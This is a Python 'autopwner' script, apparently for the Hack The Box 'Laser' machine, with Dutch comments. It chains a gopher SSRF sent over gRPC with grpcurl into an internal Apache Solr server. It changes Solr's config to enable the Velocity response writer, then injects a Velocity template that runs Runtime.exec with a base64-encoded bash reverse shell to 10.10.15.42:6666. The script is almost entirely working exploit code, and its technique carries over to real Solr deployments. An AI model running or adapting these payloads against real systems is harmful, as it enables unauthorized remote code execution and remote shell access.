# Hackthebox LAser Autopwner [met grpcurl]
# EDUCATIEVE DOELEINDEN 

# EMirhan SariKaYa

import sys
import pickle
import base64
import subprocess

payload = 'bash -c {echo,' + base64.b64encode("bash -i >& /dev/tcp/10.10.15.42/6666 0>&1").replace('+','%2b') + '}|{base64,-d}|{bash,-i}'

def send_url(url):
    feed_url = '{"feed_url": "gopher://localhost:8983/_' + url + '"}'
    print(feed_url)
    feed_url_b64 = base64.b64encode(pickle.dumps(feed_url))
    cmd = '/home/gnu_g0d/HTB/Laser/grpcurl -max-time 5 -plaintext -proto laser.proto -d \'{"data":"' + feed_url_b64 + '"}\' 10.10.10.201:9000 Print.Feed'
    subprocess.call(cmd,shell=True)



def enc(data):
    return str(data.replace('%','%25').replace('\n','%0d%0a').replace('"','\\"'))

def url_get(header,req):
    send_url(enc(req) + enc(header))
    

def url_post(header,body):
    send_url(enc(header) + "%0d%0a%0d%0a" + enc(body)) # whaha eggshell 2 unic



# dit is een POST Request, we kunnen op port 8983 alleen via een gRPC request op komen..

body = """
{
    "update-queryresponsewriter": {
    "startup": "lazy",
    "name": "velocity",
    "class": "solr.VelocityResponseWriter",
    "template.base.dir": "",
    "solr.resource.loader.enabled": "true",
    "params.resource.loader.enabled": "true"
  }
}""".strip().replace('\n','').replace(' ','')

header = """
POST /solr/staging/config HTTP/1.1
Host: localhost:8983
Content-Type: application/json
Content-Length: {}
""".format(len(body)).strip()



url_post(header,body)

# dit is een GET request.... (gewoon om te testen)


header = 'HTTP/1.1\nHost: localhost:8983\n'

template = '%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec("PAYLOAD"))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end'

req = 'GET /solr/staging/select?q=1&&wt=velocity&v.template=custom&v.template.custom=' + template.replace('PAYLOAD',payload).replace(' ','%20') 





url_get(header,req)
